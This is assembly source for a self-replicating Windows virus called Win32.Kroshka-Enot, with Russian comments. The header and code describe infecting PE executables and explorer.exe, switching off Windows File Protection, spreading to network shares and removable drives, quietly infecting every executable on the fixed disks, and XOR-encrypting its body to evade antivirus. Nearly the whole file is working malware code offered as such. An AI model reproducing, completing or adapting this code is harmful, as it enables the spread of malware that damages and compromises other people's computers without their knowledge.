;===============================================================================;
;			      Win32.Kroshka-Enot				;
;				      by					;
;			     Bill Prisoner / TPOC				;
;===============================================================================;
;										;
;Features:									;
;	*Infecting PE-files							;
;		Не заражает файлы с оверлеем. Заражение ведется			;
;		расширением последней секции. Также добавляется 		;
;		дополнительная пустая секция, чтобы аверы не 			;
;		обнаружили нас так просто. 					;
;		При запуске заражает explorer.exe. После 			;
;		перезагрузки работу начнет зараженный Explorer.			;
;		Если у нас нет прав админа или если не удается переименовать	;
;		эксплорера, то запукается неадминовская ветка, 			;
;		которая копируется 						;
;		в папку Windows или если не может, то в тепм. Регистрируется в 	;
;		авторане и остается в памяти.					;
;	*Local Network Infecting						;
;		Просмотр всех доступных расшаренных сетевых ресурсов и 		;
;		копирование туда						;
;		своего тела. Размер копируемых файлов произвольный. 		;
;		Вирь на один ресурс копирует не больше 4-х файлов		;
;	*Windows File Protection Kill						;
;		Для заражение Explorer'а вирус отключает на лету		;
;		службу защиты файлов WFP. Эта служба - откровенное гавно,	;
;		потому что так просто отключается. Спасибо за подарок Microsoft!;
;	*Copying on the Remote Disks						;
;		Копирование зараженной проги на дискеты и флэшки. 		;
;		Копируется файл вживленный в код вируса со случайным именем	;
;		из списка.							;
;	*Structured Exception Handling						;
;		Если возникнет исключение в зараженном файле, то управление 	;
;		перейдет просто на нормальный код. SEH устанавливается		;
;		также в каждом из потоков который порождает вирус  		;
;	*Sleeping Infecting All Fixed Disks					;
;		Рекурсивно заражаем все исполняемые файлы на всех дисках. 	;
;		Для каждого из	дисков работает отдельный поток.		;
;		Сканирование и заражение идет в спящем режиме			;
;		и поэтому незаметно для юзэра. Пропускаем директории Windows	;
;		и Program Files.						;
;	*Stealth								;
;		Шифрование всего кода вируса за исключением			;
;		криптора(декриптора). One-layer шифрование xor'ом по ключу 66h	;
;	*Payload								;
;		Каждое 9-ое число каждого месяца выводит MessageBox с текстом. 	;
;Tested On:									;
;	Windows XP without SP							;
;	Windows XP SP1								;
;	Windows 2000 Server SP3							;
;===============================================================================;
;===============================================================================;
;		Options and Includes for first Generation			;
;===============================================================================;
.386										;
option casemap:none								;
.model flat,stdcall								;
include \tools\masm32\include\windows.inc					;
include \tools\masm32\include\kernel32.inc					;
includelib \tools\masm32\lib\kernel32.lib					;
;===============================================================================;


;===============================================================================;
;				Code Section					;
;===============================================================================;
.code
start:
ShellCode:
;Сохраняем регистры и флаги
	push esi
	push edi
	push ebx
	push ebp
	pushfd
;Вычисляем дельту
	call delta
include D:\Tools\Masm32\BIN\Kroshka-Enot\Crypt.asm;Классный трюк с дельта смещением, да? ж:-)
delta:
	pop ebp
	sub ebp,offset delta
	add ebp,SizeCrypt
;Расшифровка всего кода
	.if ebp!=0
		push ebp
		call Crypt
	.endif
	jmp Begin

include D:\Tools\Masm32\BIN\Kroshka-Enot\api.asm;Базовые функции для получения API
include D:\Tools\Masm32\BIN\Kroshka-Enot\seh.asm;SEH
include D:\Tools\Masm32\BIN\Kroshka-Enot\wfp.asm;Windows File Protection
include D:\Tools\Masm32\BIN\Kroshka-Enot\pe.asm;Working Portable Executable Files
include D:\Tools\Masm32\BIN\Kroshka-Enot\FileNames.asm;Имена файлов для копирования
include D:\Tools\Masm32\BIN\Kroshka-Enot\ApiBlocks.asm;Блоки для адресов API-функций
include D:\Tools\Masm32\BIN\Kroshka-Enot\SleepInfection.asm;Медленное заражение всех дисков
include D:\Tools\Masm32\BIN\Kroshka-Enot\GetRandomFileName.asm;Получение произвольного имени файла
include D:\Tools\Masm32\BIN\Kroshka-Enot\CopyRemovable.asm;Копирование виря на дискеты и флэшки
include D:\Tools\Masm32\BIN\Kroshka-Enot\Buffers.asm;Работа с буферами :)
include D:\Tools\Masm32\BIN\Kroshka-Enot\InfectLocalNetwork.asm;Заражение локалки
include D:\Tools\Masm32\BIN\Kroshka-Enot\IfNotAdmin.asm;Не админовская ветка
include D:\Tools\Masm32\BIN\Kroshka-Enot\ChangeFileSize.asm;Изменение размера зараженного файла на произвольный
include D:\Tools\Masm32\BIN\Kroshka-Enot\NumberOfOurFiles.asm;Количесво зараженных файлов на указанном пути
include D:\Tools\Masm32\BIN\Kroshka-Enot\Payload.asm;Полезная нагрузка

StartCrypt:
;===============================================================================;
;ThreadProc proc Delta:DWORD
;Описание: Потоковая процедура основной работы вируса в треде эксплорера
;Вход:
;	Delta - дельта смещение
;===============================================================================;
ThreadProc proc Delta:DWORD
LOCAL BufferForData:DWORD
	startproc
	mov ebx,Delta
;Сохраняем рабочую среду до начала работы треда для возможной обработки ошибок
	mov [ebx+OldESP3],esp
	mov [ebx+OldEBP3],ebp
Safe:
;Устанавливаем SEH
	lea eax,[ebx+Safe]
	CreateSEHFrameEx eax,ebx,[ebx+OldEBP3],[ebx+OldESP3]
;Режим ошибок
	push SEM_FAILCRITICALERRORS
	apiproc _SetErrorMode
;Присутствие в системе
	lea eax,[ebx+MutexName]
	push eax
	push FALSE
	push 0
	apiproc _CreateMutexA
;Полезная нагрузка
	push ebp
	call Payload
;Буфер для данных о дисках
	push ebx
	call AllocBuffer
	mov BufferForData,eax
;Медленное заражение
 	push ebx
	call SleepInfection
;Цикл для потока
NextCycle:
	push 120000;Спим две минуты
	apiproc _Sleep
;Копирования тела на дискеты и на сьемные диски
	push ebx
	push BufferForData
	call CopyRemovable
;Заражение локальной сети
	push ebx
	call InfectLocalNetwork
jmp NextCycle
	DeleteSEHFrame
	endproc
	ret
ThreadProc endp

include D:\Tools\Masm32\BIN\Kroshka-Enot\BinData.inc;Данные двоичного преcompiled файла
include D:\Tools\Masm32\BIN\Kroshka-Enot\ApiStrings.asm;Блоки для адресов API-функций
;===============================================================================;
;				     Строки					;
;===============================================================================;
	VirusName			db		"This is Kroshka-Enot Virus!!!",0
					db		"Hello All Peoples From Russia!!!",0
					db		"Copyright [TPOC] 2005",0

	advapi32Str			db		"advapi32.dll",0
	user32Str 			db		"user32.dll",0
	ExplorerStr 			db		"\explorer.exe",0
	ExplorerStr2 			db		"\explorer1.exe",0
	NewFileName 			db		"\Smmcss.dat",0
	Kernel32Str			db		"kernel32.dll",0
	CreateProcessStr		db		"CreateProcessW",0
	TempFile			db		"\Kroshka-Enot.exe",0
	ThisIsFirstGen			db		"Error opening file!",0
	Message				db		"Error!",0
	MprStr				db 		"mpr.dll",0
	WinInetStr			db		"wininet.dll",0
	MutexName			db		"Kroshka-Enotv1",0
;===============================================================================;
;				     Переменные					;
;===============================================================================;
	OldESP 				dd			0
	OldEBP 				dd 			0
	OldESP2				dd			0
	OldEBP2				dd 			0
	OldESP3				dd			0
	OldEBP3				dd 			0
	osver 				OSVERSIONINFO 		<0>
	BufferForModuleName 		dd 			0
	BufferForExplorerName 		dd 			0
	BufferForNewExplorerName 	dd 			0
	ThreadId			dd 			0
	hFile				dd 			0
	hMapping			dd 			0
	hMap				dd 			0
	FileSize			dd			0
	RealCreateProcess		dd			0
	Disk				dd			0
;===============================================================================;
;				     Код вируса					;
;===============================================================================;
Begin:
;Сохраняем рабочую среду до начала работы вируса для возможной обработки ошибок
	mov [ebp+OldESP],esp
	mov [ebp+OldEBP],ebp
;Устанавливаем SEH
	lea eax,[ebp+Error]
	CreateSEHFrameEx eax,ebp,[ebp+OldEBP],[ebp+OldESP]
;База KERNEL32.DLL
	GetKernelBase
;Получаем адреса API для KERNEL32.DLL
	push ebp
	push eax
	lea ebx,[ebp+address]
	push ebx
	lea ebx,[ebp+imp]
	push ebx
	push 53
	call GetAPIs
;Получаем базу для ADVAPI32.DLL.
;Учитываем счетчик загрузок для DLL и не увеличиваем его,
;если DLL уже загружена 
	lea ebx,[ebp+advapi32Str]
	push ebx
	api _GetModuleHandleA

	.if eax==0
		lea ebx,[ebp+advapi32Str]
		push ebx
		api _LoadLibraryA
	.endif 
;Получаем адреса API для ADVAPI32.DLL
	push ebp
	push eax
	lea ebx,[ebp+address1]
	push ebx
	lea ebx,[ebp+imp1]
	push ebx
	push 7
	call GetAPIs
;Получаем базу для USER32.DLL.
;Учитываем счетчик загрузок для DLL и не увеличиваем его,
;если DLL уже загружена 
	lea ebx,[ebp+user32Str]
	push ebx
	api _GetModuleHandleA

	.if eax==0
		lea ebx,[ebp+user32Str]
		push ebx
		api _LoadLibraryA
	.endif
;Получаем адреса API для USER32.DLL
	push ebp
	push eax
	lea ebx,[ebp+address2]
	push ebx
	lea ebx,[ebp+imp2]
	push ebx
	push 3
	call GetAPIs
;Загружаем библиотеку MPR.DLL
	lea ebx,[ebp+MprStr]
	push ebx
	api _GetModuleHandleA

	.if eax==0
		lea ebx,[ebp+MprStr]
		push ebx
		api _LoadLibraryA
	.endif 
;Получаем адреса API для MPR.DLL
	push ebp
	push eax
	lea ebx,[ebp+address3]
	push ebx	
	lea ebx,[ebp+imp3]
	push ebx
	push 3
	call GetAPIs
;Загружаем библиотеку WININET.DLL
	lea ebx,[ebp+WinInetStr]
	push ebx
	api _GetModuleHandleA

	.if eax==0
		lea ebx,[ebp+WinInetStr]
		push ebx
		api _LoadLibraryA
	.endif 
;Получаем адреса API для WININET.DLL
	push ebp
	push eax
	lea ebx,[ebp+address4]
	push ebx	
	lea ebx,[ebp+imp4]
	push ebx
	push 1
	call GetAPIs
;Проверяем версию ОС
;Работаем только на 2000/XP, иначе выходим.
;У 2000/XP MajorVersion == 5. 
;Блять, что-то винда какую-то хуйню впаривает - dwMajorVersion внутри explorer'а показывает какое-то странное число.
;Но PlatformId вроде нормальный. Надеюсь никакой уёбок не поставил себе Windows NT 4.x сейчас
	lea ebx,[ebp+osver]
	assume ebx:ptr OSVERSIONINFO
	mov [ebx].dwOSVersionInfoSize,sizeof OSVERSIONINFO
	push ebx
	api _GetVersionExA
	
	lea ebx,[ebp+osver]
	assume ebx:ptr OSVERSIONINFO
	.if [ebx].dwPlatformId!=VER_PLATFORM_WIN32_NT
		jmp EndVir
	.endif
;Выделяем регион для строки с именем текущего модуля
	push ebp
	call AllocBuffer
	mov dword ptr [ebp+BufferForModuleName],eax
;Получаем имя текущего модуля для сравнения его с EXPLORER.EXE
	push 255
	push eax
	push NULL
	api _GetModuleFileNameA
;Выделяем регион для строки с полным именем EXPLORER.EXE
	push ebp
	call AllocBuffer
	mov dword ptr [ebp+BufferForExplorerName],eax
;Получить путь к папке мастдая
	push 255
	push eax
	api _GetWindowsDirectoryA
;Абсолютный путь для Explorer
	lea esi,[ebp+ExplorerStr]
	push esi
	push dword ptr [ebp+BufferForExplorerName]
	api _lstrcatA
;Вот тут проверяем не является этот модуль Explorer'ом?
	push dword ptr [ebp+BufferForModuleName]
	push dword ptr [ebp+BufferForExplorerName]
	api _lstrcmpiA
;Сохраняем результат возврата функции в стеке
	push eax
;Очищаем BufferForModuleName
	push ebp
	push dword ptr [ebp+BufferForModuleName]
	call FreeBuffer
;Очищаем BufferForExplorerName
	push ebp
	push dword ptr [ebp+BufferForExplorerName]
	call FreeBuffer	
;Восстанавливаем результат возврата lstrcmpiA
	pop eax
;Если EAX==0, то вирус находится в EXPLORER.EXE.
.if eax==0
	;создаем поток в контексте EXPLORER.EXE
	lea eax,[ebp+ThreadId]
	push eax
	push 0
	push ebp
	lea eax,[ebp+ThreadProc]
	push eax
	push 0
	push NULL
	api _CreateThread
	jmp EndVir
.elseif
;Админы ли мы?
	push ebp
	call EnableDebugPrivilege
	.if eax==0
		push ebp
		call IfNotAdmin
		jmp EndVir
	.endif
;Отключаем Windows File Protection
	push ebp
	call WFPKill
;Выделяем регион для строки с новым именем EXPLORER1.EXE
	push ebp
	call AllocBuffer
	mov dword ptr [ebp+BufferForExplorerName],eax
;Выделяем регион для строки с именем EXPLORER.EXE
	push ebp
	call AllocBuffer
	mov dword ptr [ebp+BufferForNewExplorerName],eax
;Кидаем в буффер директорию мастдая
	push 255
	push dword ptr [ebp+BufferForExplorerName]
	api _GetWindowsDirectoryA
;Формируем полный путь к новому Explorer'у
	lea esi,[ebp+ExplorerStr2]
	push esi
	push dword ptr [ebp+BufferForExplorerName]
	api _lstrcatA
;Кидаем в буффер директорию мастдая
	push 255
	push dword ptr [ebp+BufferForNewExplorerName]
	api _GetWindowsDirectoryA
;Формируем полный путь к старому Explorer'у
	lea esi,[ebp+ExplorerStr]
	push esi
	push dword ptr [ebp+BufferForNewExplorerName]
	api _lstrcatA
;Копируем старый Explorer в новый
	push 0
	push dword ptr [ebp+BufferForExplorerName]
	push dword ptr [ebp+BufferForNewExplorerName]
	api _CopyFileA
	.if eax==0
		jmp CopyError
	.endif
;Переименовываем EXPLORER.EXE в любой для замены
	push 255
	push dword ptr [ebp+BufferForExplorerName]
	api _GetWindowsDirectoryA	
;Формируем новое полное имя
	lea esi,[ebp+NewFileName]
	push esi	
	push dword ptr [ebp+BufferForExplorerName]
	api _lstrcatA
;Сохраняем нормальный Explorer под новым именем
	push dword ptr [ebp+BufferForExplorerName]
	push dword ptr [ebp+BufferForNewExplorerName]
	api _MoveFileA
	.if eax==0
;Кидаем в буффер директорию мастдая
CopyError:
		push 255
		push dword ptr [ebp+BufferForExplorerName]
		api _GetWindowsDirectoryA
;Формируем полный путь к новому Explorer'у
		lea esi,[ebp+ExplorerStr2]
		push esi
		push dword ptr [ebp+BufferForExplorerName]
		api _lstrcatA
;Удаляем файл explorer1.exe
		push dword ptr [ebp+BufferForExplorerName]
		api _DeleteFileA
;Очищаем BufferForNewExplorerName
		push ebp
		push dword ptr [ebp+BufferForNewExplorerName]
		call FreeBuffer
;Очищаем BufferForExplorerName
		push ebp
		push dword ptr [ebp+BufferForExplorerName]
		call FreeBuffer	
;Не админовская ветка виря
		push ebp
		call IfNotAdmin
		jmp EndVir
	.endif
;Кидаем в буффер директорию мастдая
	push 255
	push dword ptr [ebp+BufferForExplorerName]
	api _GetWindowsDirectoryA
;Формируем полный путь к новому Explorer'у
	lea esi,[ebp+ExplorerStr2]
	push esi
	push dword ptr [ebp+BufferForExplorerName]
	api _lstrcatA
;Открываем файл EXPLORER1.EXE для замены
	push NULL
	push FILE_ATTRIBUTE_NORMAL
	push OPEN_EXISTING
	push NULL
	push FILE_SHARE_WRITE or FILE_SHARE_READ 
	push GENERIC_WRITE or  GENERIC_READ
	push dword ptr [ebp+BufferForExplorerName]
	api _CreateFileA
;Проверка на правильность открытия файла
	.if eax==-1
		jmp EndVir
	.endif
	mov dword ptr [ebp+hFile],eax
;Создаем объект "проекция файла"
	push NULL
	push NULL
	push NULL
	PUSH PAGE_READWRITE
	push NULL
	push eax
	api _CreateFileMappingA
;Проверка на правильность создания проекции
	.if eax==0
		jmp EndVir
	.endif
	mov dword ptr [ebp+hMapping],eax
;Проецируем файл на адресное пространство
	push 0
	push 0
	push 0
	push FILE_MAP_ALL_ACCESS
	push eax	
	api _MapViewOfFile
	.if eax==0
		jmp EndVir
	.endif
	mov dword ptr [ebp+hMap],eax
;Правильный файл?
	push eax
	call ValidPE
	.if eax==0
		jmp ToInfect
	.endif
;Закрыть описатель проекции
	push dword ptr [ebp+hMapping]
	api _CloseHandle
;Не заражен ли уже файл?
	push dword ptr [ebp+hMap]
	call IsInfect
	.if eax==1
		jmp ToInfect
	.endif
;Есть ли в файле оверлей?
	push 0
	push dword ptr [ebp+hFile]
	api _GetFileSize
	mov dword ptr [ebp+FileSize],eax

	push dword ptr [ebp+hMap]
	push dword ptr [ebp+FileSize]
	call IsOverlay
	.IF eax==1
		jmp ToInfect
	.ENDIF
;Заражаем файл
	push ebp
	push ShellCodeLength
	lea eax,[ebp+ShellCode]
	push eax	
	push dword ptr [ebp+hMap]
	push dword ptr [ebp+BufferForExplorerName]
	call InfectExLastSection
;Добавляем пустую секцию
	push ebp
	push dword ptr [ebp+hMap]
	push dword ptr [ebp+BufferForExplorerName]
	call NewSection
ToInfect:;Explorer уже заражен или его нельзя заразить
	push dword ptr [ebp+hMap]
	api _UnmapViewOfFile

	push dword ptr [ebp+hFile]
	api _CloseHandle
;Переименовываем EXPLORER1.EXE в EXPLORER.EXE для замены
	push dword ptr [ebp+BufferForNewExplorerName]
	push dword ptr [ebp+BufferForExplorerName]
	api _MoveFileA
;Очищаем BufferForNewExplorerName
	push ebp
	push dword ptr [ebp+BufferForNewExplorerName]
	call FreeBuffer
;Очищаем BufferForExplorerName
	push ebp
	push dword ptr [ebp+BufferForExplorerName]
	call FreeBuffer	
.endif
;В случае траблов идем сюда
EndVir:
;Удаляем из стека SEH-фрейм
	DeleteSEHFrame
Error:;Прыгаем сюда, если в основном потоке возникло исключение
	endproc
ShellCodeLength equ $-ShellCode;Длина шел-кода
CryptCodeLength equ $-StartCrypt;Размер шифрованного кода
	push MB_ICONERROR
	push offset Message
	push offset ThisIsFirstGen
	push 0
	call _MessageBoxA
	push 0
	call ExitProcess
end start